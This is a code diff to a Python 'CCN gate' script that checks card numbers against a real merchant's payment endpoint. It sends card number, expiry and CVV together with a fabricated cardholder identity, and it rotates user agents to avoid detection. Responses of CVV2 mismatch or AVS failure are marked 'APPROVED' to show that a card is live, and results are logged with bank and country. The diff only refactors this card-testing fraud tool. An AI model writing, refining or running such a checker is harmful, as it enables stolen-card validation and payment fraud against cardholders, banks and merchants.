@@ -4,7 +4,7 @@ import time
 from faker import Faker
 from random import choice
 from curl_cffi import requests
-from colorama import init, Fore
+from colorama import init
 from fake_useragent import UserAgent
 
 def usuario() -> dict:
@@ -51,13 +51,14 @@ def ccn_gate(card: str) -> dict:
                 ano_number = ano_number[2:4]
             agente_user = UserAgent().random
 
-            # Address fake
-            name = usuario()['name'].split(' ')[0]
-            last = usuario()['name'].split(' ')[1]
+            # Fake address
+            user_fake = usuario()
+            name = user_fake['name'].split(' ')[0]
+            last = user_fake['name'].split(' ')[1]
             number = random.randint(1111, 9999)
             street = f"{name}+street+{number}"
-            email = usuario()['email']
-            phone = usuario()['phone']
+            email = user_fake['email']
+            phone = user_fake['phone']
 
             # Request 1
             headers = {"User-Agent": agente_user}
@@ -86,13 +87,12 @@ def ccn_gate(card: str) -> dict:
             data = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}"
             result = cliente.post("https://glorybee.com/paya/checkout/request", data=data, headers=headers)
 
+            # Extraer mensaje y código de la respuesta
             message_text = capture(result.text, '"message":"', '"')
             message_code = capture(result.text, '"code":"', '"')
 
             status = "DECLINED"
-            if message_text and "CVV2 MISMATCH" in message_text:
-                status = "APPROVED"
-            elif message_text and "AVS FAILURE" in message_text:
+            if message_text and ("CVV2 MISMATCH" in message_text or "AVS FAILURE" in message_text):
                 status = "APPROVED"
 
             fin = time.time()
@@ -101,7 +101,7 @@ def ccn_gate(card: str) -> dict:
             return {
                 "card": f"{cc_number}|{mes}|{ano_number}|{cvv}",
                 "status": status,
-                "message": f"{message_text}|{message_code}" if message_text else "No response",
+                "message": f"{message_text} | {message_code}" if message_text else "No response",
                 "bin": "VISA CLASSIC DEBIT",
                 "bank": "BANCO LAFISE BANCENTRO, S.A.",
                 "country": "NICARAGUA 🇳🇮",
